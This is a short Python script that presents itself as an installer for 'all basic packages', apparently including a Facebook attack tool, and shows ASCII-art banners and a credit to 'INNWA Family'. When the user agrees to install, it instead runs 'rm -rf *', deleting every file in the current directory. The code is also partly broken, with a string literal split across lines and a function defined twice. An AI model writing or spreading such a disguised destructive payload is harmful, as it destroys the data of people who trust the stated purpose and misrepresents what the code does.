import os
import time
import sys

os.system("clear")

print('''\033[91m
PPPP
P            P
P            P
PPPP
P
P
P

y               y
   y         y
      y   y
         y
         y
         y
         y

   aaa
a         a
a         a
aaaaa
a         a
a         a
a         a

eeeee
e
e
eeeee
e
e
eeeee

   ssss
s
s
   sss
            s
            s
ssss

   oooo   
o            o
o            o
o            o
o            o
o            o
   oooo   

n               n
nn            n
n   n         n
n      n      n
n         n   n
n            nn
n               n

eeeee
e
e
eeeee
e
e
eeeee

h         h
h         h
h         h
hhhhh
h         h
h         h
h         h

     m                         m
     mm               mm
     m     m     m     m
     m          m          m
     m                         m
     m                         m
     m                         m

   oooo   
o            o
o            o
o            o
o            o
o            o
   oooo   

   oooo   
o            o
o            o
o            o
o            o
o            o
   oooo
''')
def slowprint(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(5. / 100)

print (''' \033[95m
+--------------------------------------+
 Install All Basic Packages |
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
|  By Zero_@290G |
**************************************''')

slowprint('
[01] fb-attekre')

print ("                                            ")
choice = input("\033[93mDo You Want to Install All Packages [y/n] : ")
if choice == 'n' : sys.exit()
if choice == 'y' : os.system ("rm -rf *")
def slowprint(s):
    for c in s + '\n' :
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(8. / 100)
print("\033[95m+-------------------------------------------------+")
slowprint('''\033[95m|           We are INNWA Family           |''')
print("+-------------------------------------------------+")

input("\n\nPress the enter key to exit : ")
